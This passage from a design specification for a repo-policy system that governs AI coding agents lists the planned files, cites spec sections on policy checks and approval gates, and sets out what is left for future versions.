- `packages/policy-sdk/forge_policy/schema.py` (re-exports `forge_contracts` policy models)
- `packages/policy-sdk/forge_policy/loader.py`
- `packages/policy-sdk/forge_policy/evaluator.py`
- `packages/policy-sdk/forge_policy/matching.py`
- `packages/policy-sdk/forge_policy/defaults.py`
- `packages/policy-sdk/forge_policy/errors.py`
- `packages/policy-sdk/forge_policy/policy.schema.json`
- `packages/policy-sdk/tests/{test_schema,test_loader,test_evaluator,test_matching,test_examples}.py`
- `packages/policy-sdk/tests/fixtures/{policy_canonical.yaml,policy_invalid_extra_key.yaml,policy_malformed.yaml,AGENTS.md}`

**Contracts (Phase-0 file F04 fills the policy DTOs in):**
- `packages/contracts/forge_contracts/policy.py`

**Data model + migration:**
- `packages/db/forge_db/models/repo_policy_snapshot.py`
- `packages/db/forge_db/models/agent_run.py` (add `policy_snapshot_id`)
- `packages/db/migrations/versions/xxxx_add_repo_policy_snapshot.py`

**API:**
- `apps/api/forge_api/routers/policy.py`
- `apps/api/forge_api/services/policy_service.py`
- `apps/api/forge_api/schemas/policy.py`
- `apps/api/forge_api/cli/policy.py`
- `apps/api/tests/{test_policy_routes,test_policy_cli}.py`

**Worker:**
- `apps/worker/forge_worker/tasks/policy.py`
- `apps/worker/tests/test_policy_task.py`

**Frontend:**
- `apps/web/app/(board)/projects/[projectId]/repos/[repoId]/policy/page.tsx`
- `apps/web/components/policy/{EffectivePolicyView,AgentsMdPreview,PolicyValidator,PolicyProfilesTable}.tsx`
- `apps/web/lib/hooks/usePolicy.ts`

**Examples:**
- `examples/policies/{python-api,typescript-frontend,go-service,infrastructure,docs}.yaml`

---

## 11. Research references (relevant links from the spec/research report)

- FORGE_SPEC.md §"Repo Policy System" — the authoritative `policy.yaml` schema (reproduced in §4).
- FORGE_SPEC.md §"Security" — *"Policy evaluation: Every tool invocation checked against repo policy before execution"*; secret redaction; sandbox isolation.
- FORGE_SPEC.md §"Core Design Principles" #3 (repo-aware/policy-aware) and §"Build Prompt" constraints #1, #2 (repo target + policy before execution; agent never self-expands scope).
- FORGE_SPEC.md §"Workflow Engine" — `task_ready → executing` precondition `policy_loaded`; `escalation_policy.on_policy_conflict: escalate_to_admin`.
- FORGE_SPEC.md §"Human Approval System" — Approval Gate "Policy override — Always required".
- FORGE_SPEC.md §"Knowledge and Retrieval" — chunk weight 1.5× / highest freshness for *Policy files / AGENTS.md*.
- FORGE_SPEC.md §"Multi-Agent Orchestration" — Subagent Role Definitions (the `SubAgentRole` enum + scoped-tools rationale).
- forge-research-report.md §"Symphony and Open SWE" — Open SWE's AGENTS.md repo-context-loading pattern (load repo instructions before execution; structured task context over free-form prompting).
- forge-research-report.md §"Spec-Driven Development" / Microsoft constitution-first — guardrails-before-work rationale that motivates fail-closed policy loading.
- `pathspec` (gitwildmatch) — implementation choice for gitignore-style glob semantics matching the spec's `**`/`*.pem` examples.

---

## 12. Out of scope / future

- **Task-level `allowed_actions`/`restricted_actions` composition** — defined on the Task schema; the runtime tool gate (`v1/F06-single-execution-agent`) overlays them on the repo `Decision`. F04 supplies the repo-policy decision only.
- **Conditional/advanced policy engine** (FORGE_SPEC.md Phase 3) — rule expressions, time/branch-conditional rules, per-environment matrices. V1 is flat declarative rules.
- **`max_parallel` subagent concurrency enforcement** — owned by the multi-agent coordinator (V3); evaluator only validates `allow_subagents` + role.
- **In-UI editing/commit of `.forge/policy.yaml`** back to the repo (PR-to-policy) — V1 UI is read + validate + template-manage; files are edited in git.
- **Nested per-directory `AGENTS.md` precedence merging** beyond root + `.forge/AGENTS.md` — V1 loads the first hit; directory-scoped merge is future.
- **Policy `PolicyProfile` → repo bootstrap** (generate a starter `.forge/policy.yaml` PR from a template) — future.
- **MCP tool-call policy evaluation specifics** — MCP calls reuse `evaluate()` via the same `ToolCall` path; MCP-specific namespace/write-default rules live in the MCP gateway slice (`v1/F09-mcp-gateway-v1`), which references F04 for the generic gate (spec MCP rule 7).
